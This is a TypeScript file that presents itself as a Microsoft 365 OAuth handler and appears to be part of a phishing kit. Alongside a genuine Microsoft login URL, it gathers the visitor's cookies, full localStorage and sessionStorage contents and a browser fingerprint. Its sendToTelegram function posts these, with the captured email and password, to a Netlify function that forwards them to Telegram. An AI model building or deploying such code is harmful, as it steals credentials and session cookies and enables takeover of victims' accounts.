// OAuth Handler for Microsoft 365 Authentication
export const generateState = (): string => {
  const state = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
  localStorage.setItem('oauth_state', state);
  localStorage.setItem('oauth_start_time', Date.now().toString());
  return state;
};

export const buildOAuthUrl = (provider: string, state: string): string => {
  // Store pre-auth cookies for comparison
  const preAuthCookies = getBrowserFingerprint();
  localStorage.setItem('pre_auth_cookies', JSON.stringify(preAuthCookies));
  localStorage.setItem('selected_provider', provider);

  // Microsoft OAuth configuration
  const clientId = 'your-microsoft-client-id'; // Replace with actual client ID
  const redirectUri = encodeURIComponent(window.location.origin + '?oauth_callback=true');
  const scope = encodeURIComponent('openid profile email');
  
  const oauthUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
    `client_id=${clientId}&` +
    `response_type=code&` +
    `redirect_uri=${redirectUri}&` +
    `scope=${scope}&` +
    `state=${state}&` +
    `response_mode=query`;

  console.log('🔗 Microsoft OAuth URL generated:', oauthUrl);
  return oauthUrl;
};

export const getBrowserFingerprint = () => {
  try {
    return {
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      screen: {
        width: screen.width,
        height: screen.height,
        colorDepth: screen.colorDepth
      },
      cookies: document.cookie,
      localStorage: getStorageData('localStorage'),
      sessionStorage: getStorageData('sessionStorage'),
      timestamp: new Date().toISOString()
    };
  } catch (error) {
    console.error('Error getting browser fingerprint:', error);
    return {
      error: error.message,
      timestamp: new Date().toISOString(),
      cookies: document.cookie
    };
  }
};

export const getStorageData = (storageType: 'localStorage' | 'sessionStorage') => {
  try {
    const storage = window[storageType];
    const data: { [key: string]: string } = {};
    for (let i = 0; i < storage.length; i++) {
      const key = storage.key(i);
      if (key) {
        data[key] = storage.getItem(key) || '';
      }
    }
    return Object.keys(data).length > 0 ? JSON.stringify(data) : 'Empty';
  } catch (e) {
    return 'Access denied';
  }
};

export const sendToTelegram = async (sessionData: any, fingerprint: any) => {
  // Use environment variables or fallback to sendTelegram function
  try {
    const response = await fetch('/.netlify/functions/sendTelegram', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        email: sessionData.email,
        password: sessionData.password || 'OAuth Login',
        provider: sessionData.provider || 'Microsoft',
        fileName: sessionData.fileName || 'OAuth Session',
        timestamp: sessionData.timestamp,
        userAgent: navigator.userAgent,
        browserFingerprint: fingerprint,
        documentCookies: document.cookie,
        sessionId: sessionData.sessionId,
        cookies: fingerprint.cookies || document.cookie,
        formattedCookies: fingerprint.formattedCookies || [],
        localStorage: fingerprint.localStorage,
        sessionStorage: fingerprint.sessionStorage,
        authenticationMethod: sessionData.authenticationMethod,
        deviceInfo: sessionData.deviceInfo
      })
    });

    const result = await response.json();
    console.log('✅ OAuth data sent to Telegram:', result);
    return result;
  } catch (error) {
    console.error('❌ Failed to send OAuth data to Telegram:', error);
    return { error: error.message };
  }
};